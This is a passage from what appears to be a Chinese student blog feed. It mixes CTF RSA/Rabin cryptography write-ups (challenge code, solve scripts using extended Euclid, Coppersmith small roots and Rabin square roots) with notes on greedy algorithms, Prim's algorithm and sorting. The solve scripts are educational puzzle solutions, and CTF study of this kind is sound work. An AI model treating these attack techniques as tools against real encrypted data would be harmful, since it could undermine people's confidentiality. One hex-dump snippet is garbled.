class="hljs-subst">&#123;b&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;d = <span class="hljs-subst">&#123;d&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;y = <span class="hljs-subst">&#123;y&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;h = <span class="hljs-subst">&#123;x*m&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 133497915779382863191750985139274661777547262395290628161924420897772911005538338729076080701700641387222690295548776566406640902391412661622674862629221960258683570655393881212072865809598640669325347893228617784548982886334708010706482958773921901369314425694414231562752232070402056445403762485870067804611</span><br><span class="hljs-string">a = 9956367951694116871507184264812038680047685394446603010101493156120195118634053526664122377707243776744926630820373051608195739431033785355316509320690639</span><br><span class="hljs-string">b = 10372715760267086803036635068149481902075294943354407472550232447612611381527989796797133302495652064200149218004252582942179771677307157495328484190016267</span><br><span class="hljs-string">c = 6954444546090251351899752282258945069765577103755637726562318645879810909547057855773433206441550954298878711294660493586907360045986061150306446126101573</span><br><span class="hljs-string">d = 12708905621484064085174866220764918657140490021181156214236692898034114314742314389460399916798129560082685314351680895409634875081403212130502800572290391</span><br><span class="hljs-string">y = 89881957270704175663646084308402351944545222001266778194637035700540903495792268004845278611707036762628657152963392762363015748904045511650663013086598899685992255568758440781657480520250399778976982455784259655683731183717562593121780657623767804362641533930566522430</span><br><span class="hljs-string">h = 584447473604416360596641349947186936435346265446590336271443321812736224750414727189483734666053582372219773206703655293254283559436185831581631</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-1">exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage:</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">133497915779382863191750985139274661777547262395290628161924420897772911005538338729076080701700641387222690295548776566406640902391412661622674862629221960258683570655393881212072865809598640669325347893228617784548982886334708010706482958773921901369314425694414231562752232070402056445403762485870067804611</span><br>a = <span class="hljs-number">9956367951694116871507184264812038680047685394446603010101493156120195118634053526664122377707243776744926630820373051608195739431033785355316509320690639</span><br>b = <span class="hljs-number">10372715760267086803036635068149481902075294943354407472550232447612611381527989796797133302495652064200149218004252582942179771677307157495328484190016267</span><br>c = <span class="hljs-number">6954444546090251351899752282258945069765577103755637726562318645879810909547057855773433206441550954298878711294660493586907360045986061150306446126101573</span><br>d = <span class="hljs-number">12708905621484064085174866220764918657140490021181156214236692898034114314742314389460399916798129560082685314351680895409634875081403212130502800572290391</span><br>y = <span class="hljs-number">89881957270704175663646084308402351944545222001266778194637035700540903495792268004845278611707036762628657152963392762363015748904045511650663013086598899685992255568758440781657480520250399778976982455784259655683731183717562593121780657623767804362641533930566522430</span><br>h = <span class="hljs-number">584447473604416360596641349947186936435346265446590336271443321812736224750414727189483734666053582372219773206703655293254283559436185831581631</span><br><br>PR.&lt;x&gt; = PolynomialRing(GF(p))<br>f = a*x^<span class="hljs-number">3</span> + b*x^<span class="hljs-number">2</span> + c*x + d - y<br>f = f.monic()<br>res = f.small_roots()<br>m = h // <span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法-5-贪心算法</title>
    <link href="/2023/12/02/%E7%AE%97%E6%B3%95%205-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"/>
    <url>/2023/12/02/%E7%AE%97%E6%B3%95%205-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="最优化问题">最优化问题</h2><p>一般特征：问题有n个输入，问题的解是由这n个输入的某个子集组成，这个子集必须满足某些事先给定的条件。</p><ul><li><p>约束条件：子集必须满足的条件</p></li><li><p>可行解：满足约束条件的子集；可行解可能不唯一</p></li><li><p>目标函数：用来衡量可行解优劣的标准，一般以函数形式给出</p></li><li><p>最优解：能够使目标函数取极值 (极大或极小)的可行解、</p></li></ul><p>最优化问题求解分类：根据描述问题约束条件和目标函数的数学模型的特性和问题的求解方法的不同，可分为：线性规划、整数规划、非线性规划、动态规划、分支限界法等<strong>精确算法</strong></p><p>贪心方法：一种改进的分级的处理方法，可对满足上述特征的某些问题方便地求解，属于<strong>近似算法</strong>。即每次在做选择时，总是先选择具有相同特征的那个解，即“贪心解”</p><h2 id="贪心算法">贪心算法</h2><h3 id="概述">概述</h3><p>当某问题具有最优子结构性质时，可用动态规划法求解(精解确、大规模等问题效率低)，但有时用贪心算法求解会更简单、更有效。</p><p>顾名思义，<strong>贪心算法总是作出在当前看来最好的选择</strong>，并不从整体最优考虑，它所作出的选择只是在某种意义上的局部最优选择。当然，其希望得到的最终结果是整体最优的。</p><p>虽然不能对所有问题都得到整体最优解，但对许多问题它能产生整体最优解。如单源最短路经问题，最小生成树问题等。在一些情况下，贪心算法不能得到整体最优解，但其最终结果是最优解的近似。</p><h3 id="基本思想">基本思想</h3><ul><li>从问题的某一个初始解出发，通过一系列的贪心选择，即当前状态下的局部最优选择，逐步逼近给定的目标，尽可能快地求得更好的解。</li><li>在贪心算法(GreedyMethod)中采用逐步构造/分级最优解的方法。在每个阶段，都作出一个按某个评价函数最优的决策，该最优评价函数称为贪心准则(GreedyCriterion)</li><li>贪心算法的正确性，要证明按贪心准则求得的解是全局最优解</li></ul><h3 id="基本步骤">基本步骤</h3><ol type="1"><li>决定问题的最优子结构</li><li>设计出一个递归解</li><li>证明在递归的任一阶段，最优选择之一总是贪心选择，那么做贪心选择总是安全的。</li><li>证明通过做贪心选择，所有子问题(除一个以外)都为空，即只产生一个子问题</li><li>设计出一个实现贪心策略的递归算法。</li><li>(性能角度) 将递归算法转换成迭代算法。</li></ol><h3 id="贪心算法的基本要素">贪心算法的基本要素</h3><p>对于一个具体的问题，怎么知道是否可用贪心算法解此问题，以及能否得到问题的最优解呢？这个问题很难给予肯定的回答。但是，从许多可以用贪心算法求解的问题中看到这类问题一般具有2个重要的性质：贪心选择性质和最优子结构性质</p><p><strong>贪心选择性质</strong></p><p>所谓贪心选择性质是指所求问题的整体最优解可以通过一系列局部最优的选择，即贪心选择来达到。这是贪心算法可行的第一个基本要素，也是贪心算法与动态规划算法的主要区别。</p><p>动态规划算法通常以自底向上的方式解各子问题，而贪心算法则通常以自顶向下的方式进行，以迭代的方式作出相继的贪心选择，每作一次贪心选择就将所求问题简化为规模更小的子问题。</p><p>对于一个具体问题，要确定它是否具有贪心选择性质，必须证明每一步所作的贪心选择最终导致问题的整体最优解，否则得到的是近优解。</p><p><strong>最优子结构性质</strong></p><p>当一个问题的最优解包含其子问题的最优解时，称此问题具有最优子结构性质。</p><p>问题的最优子结构性质是该问题可用动态规划算法或贪心算法求解的关键特征。但是，需要注意的是，并非所有具有最优子结构性质的问题都可以采用贪心策略来得到最优解</p><p>贪心算法只需考虑一个选择(即贪心的选择)；在做贪心选择时，子问题之一必须是空的，因此只留下一个非空子问题。（是什么意思🙄</p><h3 id="贪心算法-vs-动态规划">贪心算法 vs 动态规划</h3><p>贪心算法和动态规划算法都要求问题具有最优子结构性质，但是两者存在着巨大的差别</p><p>(1)动态规划是先分析子问题，再做选择。而贪心算法是先做贪心选择，做完选择后，生成子问题，然后再去求解子问题</p><ol start="2" type="1"><li>动态规划每一步可能会产生多个子问题，而贪心算法每一步只会产生一个子问题(为非空)</li></ol><p>(3)从特点上看，动态规划是自底向上解决问题，而贪心算法是自顶向下解决问题</p><h3 id="与递归分治的联系">与递归、分治的联系</h3><p>分治策略用于解决原问题与子问题结构相似的问题，对于各子问题相互独立的情况，一般用递归实现</p><p>动态规划用于解决子问题有重复求解的情况，既可以用递归实现，也可以用迭代实现</p><p>贪心算法用于解决具有贪心选择性质的问题，既可以用递归实现，也可以用迭代实现，因为很多递归贪心算法都是尾递归，很容易改成迭代贪心算法</p><p>递归是实现手段，分治策略是解决问题的思想，动态规划和贪心算法很多时候会使用记录子问题运算结果的递归实现</p><h2 id="最小生成树prim算法">最小生成树—Prim算法</h2><h3 id="最小生成树问题">最小生成树问题</h3><h4 id="问题描述">问题描述</h4><ul><li>设<spanclass="math inline">\(G=(V,E)\)</span>是无向连通带权图，即一个网络。（V是顶点集合，E是边集合，E中每条边(v,w)的权为<spanclass="math inline">\(c[v][w]\)</span>）。</li><li>如果G的子图G’是一棵包含G的所有顶点的树，则称G’为G的生成树。生成树上各边权的总和称为该生成树的耗费。</li><li>在G的所有生成树中，耗费最小的生成树称为G的最小生成树(MST:minimumcost spanning tree)</li></ul><p><strong>Prim算法</strong>和<strong>Kruskal算法</strong>：都是解最小生成树问题的贪心算法；它们做<strong>贪心选择的方式不同</strong>，但都利用了下面的最小生成树性质。</p><h4 id="最小生成树性质">最小生成树性质</h4><ul><li>设<spanclass="math inline">\(G=(V,E)\)</span>是连通带权图，U是V的真子集。</li><li>如果<span class="math inline">\((i,j)∈E\)</span>，且<spanclass="math inline">\(i∈U，j∈V-U\)</span>，且在所有这样的边中，<spanclass="math inline">\((i,j)\)</span>的权<spanclass="math inline">\(c[i][j]\)</span>最小，那么必存在一棵包含边<spanclass="math inline">\((i,j)\)</span>的最小生成树。</li><li>这个性质也称为<strong>MST</strong>（Minimum SpanningTree）<strong>性质</strong>。</li></ul><h3 id="prim算法">Prim算法</h3><p>贪心选择策略： 每次都选择到下一顶点权最小的边。</p><p>普里姆算法的实现思路是：</p><ol type="1"><li>将连通网中的所有顶点分为两类（假设为 A 类和 B类）。初始状态下，所有顶点位于 B 类；</li><li>选择任意一个顶点，将其从 B 类移动到 A 类；</li><li>从 B 类的所有顶点出发，找出一条连接着 A类中的某个顶点且权值最小的边，将此边连接着的 A 类中的顶点移动到 B类；</li><li>重复执行第 3 步，直至 B 类中的所有顶点全部移动到 A 类，恰好可以找到N-1 条边。</li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312031052117.png"alt="Prim算法例子" /><figcaption aria-hidden="true">Prim算法例子</figcaption></figure><h4 id="代码实现">代码实现</h4><p>真的有点难度吧哥</p><p><ahref="http://data.biancheng.net/view/40.html">普里姆算法(Prim算法)求最小生成树(biancheng.net)</a></p><p><ahref="http://data.biancheng.net/view/41.html">克鲁斯卡尔算法(Kruskal算法)求最小生成树(biancheng.net)</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flags</span>轲限梭畴坫他浛<br><span class="hljs-attribute">0264D9A0</span>                                                                                                   <span class="hljs-number">66</span>                                  f<br><span class="hljs-attribute">0264D9C0</span>   <span class="hljs-number">6</span>C <span class="hljs-number">61</span> <span class="hljs-number">67</span> <span class="hljs-number">73</span> E9 F0 CF DE  FE <span class="hljs-number">8</span>F FD F3 CB F3 AB FB  B3 EB DB E3 CB FB <span class="hljs-number">9</span>B BF                            lags轲限?梭畴坫他浛<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法分析与设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法分析与设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto系列——RSA（三）</title>
    <link href="/2023/11/29/Crypto%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94RSA%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2023/11/29/Crypto%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94RSA%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="rsa3p1">[RSA3]P1</h2><h3 id="main">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&#x27;******&#x27;</span><br><br>m1 = bytes_to_long(flag[:<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>])<br>m2 = bytes_to_long(flag[<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>:])<br><br><span class="hljs-keyword">assert</span> <span class="hljs-number">18608629446895353521310408885845687520013234781800558</span>*m1-<span class="hljs-number">14258810472138345414555137649316815272478951117940067</span>*m2 == <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h3 id="exp">exp</h3><p>本题非常直白，将flag分成两部分后给了一个约束式，让我们求解flag。</p><p>约束是一个二元一次方程，显然我们知道二元一次方程在实数域上会有无数个解，但注意我们很少会在实数域上进行运算，我们所有的操作都是在一个整数域或者有限域（可以理解为取模的域）中进行运算。而这里我们便有一个非常常用的<strong>裴蜀定理</strong></p><p><strong>裴蜀定理</strong>：对于整数域中的不定方程<spanclass="math inline">\(ax+by=m\)</span>，其有解的充要条件为<spanclass="math inline">\(gcd(a,b)\ | \ m\)</span></p><blockquote><p>裴蜀定理，又称贝祖定理。是一个关于最大公约数的定理。其内容定义为：对于不全为零的任意整数a 和 b，记二者的最大公约数为 g 即 gcd(a,b) = g，则对于任意整数 x 和 y都一定满足 ax+by 是 g 的倍数。</p><p>特别地，一定存在整数 x 和 y 的解，使得 <spanclass="math inline">\(ax+by=gcd(a,b)\)</span> 成立。</p><p>它的一个重要推论为：a,b互质的充分必要条件是存在整数x,y 使 ax+by=1;或者说对于方程 ax+by=1 只有整数a和b互质时，方程才有整数解x,y。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br> <br>a = <span class="hljs-number">18608629446895353521310408885845687520013234781800558</span><br>b = <span class="hljs-number">14258810472138345414555137649316815272478951117940067</span><br>g, m1, m2 = gmpy2.gcdext(a, b)<br><span class="hljs-comment"># gcdext 函数,该函数计算两个整数的最大公约数，并返回扩展欧几里得算法的解。</span><br><span class="hljs-comment">#g 是最大公约数。m1 和 m2 是扩展欧几里得算法的解，满足方程 a * m1 + b * m2 = g。</span><br><span class="hljs-comment"># print(m1,m2)</span><br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    mh = long_to_bytes(m1 + i*b)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NSSCTF&#x27;</span> <span class="hljs-keyword">in</span> mh:<br>        ml = long_to_bytes(-m2 + i*a)<br>        <span class="hljs-built_in">print</span>(mh + ml)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>至于算完m1和m2为什么还有下面的部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    mh = long_to_bytes(m1 + i*b)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NSSCTF&#x27;</span> <span class="hljs-keyword">in</span> mh:<br>        ml = long_to_bytes(-m2 + i*a)<br>        <span class="hljs-built_in">print</span>(mh + ml)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>这简直是一头🐖都能想到问题了吖（说的是博主本人是🐖</p><p>当然是因为<span class="math inline">\(a(m1 + i*b)+b(-m2 +i*a)=g\)</span>，</p><p>那为什么是<span class="math inline">\(-m_2\)</span>呢</p><p>因为<span class="math inline">\(m_2\)</span>是一个负数，你写<spanclass="math inline">\(m_2\)</span>会报错，写成<spanclass="math inline">\(-m_2\)</span>就好了</p><p><ahref="https://blog.csdn.net/weixin_51216553/article/details/117000599">浅谈扩展欧几里得算法-CSDN博客</a></p><h2 id="rsa3p2高次rabin">[RSA3]P2(高次Rabin)</h2><h3 id="main-1">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">256</span>)<br>q = getPrime(<span class="hljs-number">256</span>)<br><br><span class="hljs-keyword">assert</span> p%<span class="hljs-number">4</span> == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> q%<span class="hljs-number">4</span> == <span class="hljs-number">3</span><br><br>n = p*q<br>e = <span class="hljs-number">4</span><br>m = bytes_to_long(flag)<br><br>c = powmod(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;q = <span class="hljs-subst">&#123;q&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 59146104467364373868799971411233588834178779836823785905639649355194168174467</span><br><span class="hljs-string">q = 78458230412463183024731868185916348923227701568297699614451375213784918571587</span><br><span class="hljs-string">e = 4</span><br><span class="hljs-string">c = 1203393285445255679455330581174083350744414151272999693874069337386260499408999133487149585390696161509841251500970131235102423165932460197848215104528310</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-1">exp</h3><p>高次Rabin，这里是两次，如果是16次把<code>for i in range(2):</code>中的2改成16即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 脚本喵，只会脚本了说是😭</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br><br>p = <span class="hljs-number">59146104467364373868799971411233588834178779836823785905639649355194168174467</span><br>q = <span class="hljs-number">78458230412463183024731868185916348923227701568297699614451375213784918571587</span><br>e = <span class="hljs-number">4</span><br>c = <span class="hljs-number">1203393285445255679455330581174083350744414151272999693874069337386260499408999133487149585390696161509841251500970131235102423165932460197848215104528310</span><br><br>n = p*q<br><br>x0=gmpy2.invert(p,q)<br>x1=gmpy2.invert(q,p)<br>cs = [c]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    ps = []<br>    <span class="hljs-keyword">for</span> c2 <span class="hljs-keyword">in</span> cs:<br>        r = <span class="hljs-built_in">pow</span>(c2, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br>        s = <span class="hljs-built_in">pow</span>(c2, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br><br>        x = (r * x1 * q + s * x0 * p) % n<br>        y = (r * x1 * q - s * x0 * p) % n<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(x)<br>        <span class="hljs-keyword">if</span> n - x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(n - x)<br>        <span class="hljs-keyword">if</span> y <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(y)<br>        <span class="hljs-keyword">if</span> n - y <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(n - y)<br>    cs = ps<br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> ps:<br>    flag = long_to_bytes(m)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;NSSCTF&quot;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br><br><br></code></pre></td></tr></table></figure><h2 id="rsa3p3">[RSA3]P3</h2><h3 id="main-2">main</h3><h3 id="exp-2">exp</h3><h2 id="rsa3p4">[RSA3]P4</h2><h3 id="main-3">main</h3><h3 id="exp-3">exp</h3><h2 id="rsa3p5crt">[RSA3]P5(CRT)</h2><h3 id="main-4">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br>flag = <span class="hljs-string">b&#x27;******&#x27;</span><br>flag = bytes_to_long(flag)<br>nl = []<br>cl = []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getn</span>(<span class="hljs-params">bits</span>):<br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> n.bit_length() &lt; bits:<br>        n *= random.choice(sieve_base)<br>    <span class="hljs-keyword">return</span> n<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    n = getn(flag.bit_length())<br>    c = <span class="hljs-built_in">pow</span>(flag, <span class="hljs-number">7</span>, n)<br><br>    nl.append(n)<br>    cl.append(c)<br><br><span class="hljs-built_in">print</span>(nl)<br><span class="hljs-built_in">print</span>(cl)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">nl = [48900330639594979739701067783234903348599405413588466525574910520196852415104874636276388006189258357683981763, 52184798260918956005878710130354843122927544013692595240956998112200987084814453592388074200951779840156511, 57591305346419909943538345276263585821186563609432856462492112562586368230163591993342956384688555395772999, 1391052858660682537388264601016075339528373211889618359237336378385137832855656756800539626220549334300176727, 8401669052993451281764489325068020625937224410830694438332016050030698435746929661939302694116817188225591, 66809775375777747860816961274643428927028556487820183599747024350362932190079439298182707730302976119988715497, 41209230281867957743385705727577318625405890894626062454495908709761427062490881938652489884059847194603237277, 31140089821370202352241944402736292072447365626312703496944186462246895695650729682254970622208848300946861]</span><br><span class="hljs-string">cl = [26617913696414745819584063604277199673357890677059949687794606743781436349829925794253672010780125661705587071, 6332739614121961923948917957498597962902897015582697635859365080803944882904908423983706426654363433337197, 46154051334276357655176765655327305918368830821288083739892570534253190653909520953027859629573215723954424, 2800905135165447908315158053695706832127646195243072751493365013371469263897970241141686022109978485359114, 3597083928897756955519089479028751799504001377334447013725903377254761160933418420625119547713455139382114, 17032086144873551648611964054579542303630306316746409528107026138674853298939194425805809444921339677455174485, 36111201824253386572496248461433786832561483450731317363761227351689971628309683994429845284904292821369745345, 28548175317543234723297895187238113463350377151401226415566179373530461612253257137535830491771909906093171]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-4">exp</h3><h2 id="rsa3p6">[RSA3]P6</h2><h3 id="main-5">main</h3><h3 id="exp-5">exp</h3><h2 id="rsa3p7">[RSA3]P7</h2><h3 id="main-6">main</h3><h3 id="exp-6">exp</h3><h2 id="rsa3p8">[RSA3]P8</h2><h3 id="main-7">main</h3><h3 id="exp-7">exp</h3><h2 id="rsa3p9">[RSA3]P9</h2><h3 id="main-8">main</h3><h3 id="exp-8">exp</h3><h2 id="rsa3p10">[RSA3]P10</h2><h3 id="main-9">main</h3><h3 id="exp-9">exp</h3><h2 id="rsa3p11">[RSA3]P11</h2><h3 id="main-10">main</h3><h3 id="exp-10">exp</h3><h2 id="rsa3p12">[RSA3]P12</h2><h3 id="main-11">main</h3><h3 id="exp-11">exp</h3>]]></content>
    
    
    <categories>
      
      <category>CTF-Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构 排序</title>
    <link href="/2023/11/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E6%8E%92%E5%BA%8F/"/>
    <url>/2023/11/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E6%8E%92%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>下面这个网站动态的演示了各种排序算法，可以更加直观的了解一下</p><p><ahref="https://visualgo.net/zh/sorting?slide=1">排序（冒泡排序，选择排序，插入排序，归并排序，快速排序，计数排序，基数排序）- VisuAlgo</a></p></blockquote><h2 id="十个经典排序算法">十个经典排序算法</h2><p>排序算法可以分为内部排序和外部排序，内部排序是数据记录在内存中进行排序，而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312010909399.png"alt="排序算法总结" /><figcaption aria-hidden="true">排序算法总结</figcaption></figure><h3 id="名词解释">名词解释：</h3><p><strong>n</strong>：数据规模</p><p><strong>k</strong>：“桶”的个数</p><p><strong>In-place</strong>：占用常数内存，不占用额外内存</p><p><strong>Out-place</strong>：占用额外内存</p><p><strong>排序算法稳定性</strong>：</p><p>假定在待排序的记录序列中，存在多个具有相同的关键字的记录，若经过排序，这些记录的相对次序保持不变，即在原序列中，r[i]=r[j]，且r[i]在r[j]之前，而在排序后的序列中，r[i]仍在r[j]之前，则称这种排序算法是稳定的；否则称为不稳定的。</p><p>对于不稳定的排序算法，只要举出一个实例，即可说明它的不稳定性；而对于稳定的排序算法，必须对算法进行分析从而得到稳定的特性。需要注意的是，排序算法是否为稳定的是由具体算法决定的，不稳定的算法在某种条件下可以变为稳定的算法，而稳定的算法在某种条件下也可以变为不稳定的算法。</p><ul><li><strong>时间复杂度：</strong> 